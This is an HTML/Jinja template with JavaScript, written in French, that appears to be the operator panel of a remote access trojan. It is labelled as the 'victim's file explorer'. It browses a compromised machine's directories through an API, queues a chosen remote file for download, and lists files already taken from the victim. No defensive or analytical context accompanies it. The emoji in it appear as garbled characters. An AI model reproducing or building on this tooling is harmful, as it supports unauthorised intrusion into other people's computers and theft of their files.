{% extends "base.html" %}
{% block content %}
<h3>ğŸ“ Explorateur de fichiers de la victime</h3>

<div id="explorer-container">
    <p>ğŸ“‚ Dossier actuel : <span id="current-path">/</span></p>
    <ul id="file-list">
        <li>Chargement...</li>
    </ul>
</div>

<hr>

<form id="download-form" method="POST" action="{{ url_for('download_remote') }}">
    <input type="hidden" name="remote_path" id="remote_path_input">
    <button type="submit" id="download-button" disabled>ğŸ“¥ TÃ©lÃ©charger le fichier sÃ©lectionnÃ©</button>
</form>

<h3>ğŸ“¥ Fichiers dÃ©jÃ  tÃ©lÃ©chargÃ©s</h3>
<ul>
    {% for file in files %}
    <li><a href="{{ download_folder }}/{{ file }}">{{ file }}</a></li>
    {% endfor %}
</ul>

<style>
    .selected-file {
        font-weight: bold;
        color: #00ffff;
    }
</style>

<script>
    let currentPath = "/";
    let selectedElement = null;

    function setCurrentPath(path) {
        currentPath = path.replace(/\/+/g, "/");
        document.getElementById("current-path").textContent = currentPath;
    }

    function goUp() {
        const parts = currentPath.split("/").filter(Boolean);
        parts.pop();
        const newPath = "/" + parts.join("/");
        setCurrentPath(newPath);
        loadDirectory();
    }

    function loadDirectory() {
        fetch(`/api/ls?path=${encodeURIComponent(currentPath)}`)
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    alert("Erreur LS : " + data.error);
                    return;
                }
                clearSelection();
                renderFileList(data.entries);
            });
    }

    function renderFileList(entries) {
        const list = document.getElementById("file-list");
        list.innerHTML = "";

        if (currentPath !== "/") {
            const up = document.createElement("li");
            const upLink = document.createElement("a");
            upLink.href = "#";
            upLink.textContent = "ğŸ”™ ..";
            upLink.onclick = goUp;
            up.appendChild(upLink);
            list.appendChild(up);
        }

        entries.forEach(entry => {
            const li = document.createElement("li");
            const link = document.createElement("a");
            link.href = "#";

            if (entry.type === "D") {
                link.textContent = "ğŸ“ " + entry.name;
                link.ondblclick = () => {
                    const nextPath = currentPath === "/" ? `/${entry.name}` : `${currentPath}/${entry.name}`;
                    setCurrentPath(nextPath);
                    loadDirectory();
                };
            } else {
                link.textContent = "ğŸ“„ " + entry.name;
                link.onclick = () => {
                    const fullPath = currentPath === "/" ? `/${entry.name}` : `${currentPath}/${entry.name}`;
                    document.getElementById("remote_path_input").value = fullPath;
                    document.getElementById("download-button").disabled = false;

                    if (selectedElement) selectedElement.classList.remove("selected-file");
                    link.classList.add("selected-file");
                    selectedElement = link;
                };
            }

            li.appendChild(link);
            list.appendChild(li);
        });
    }

    function clearSelection() {
        selectedElement = null;
        document.getElementById("remote_path_input").value = "";
        document.getElementById("download-button").disabled = true;
    }

    window.onload = () => {
        setCurrentPath("/");
        loadDirectory();
    };
</script>

{% endblock %}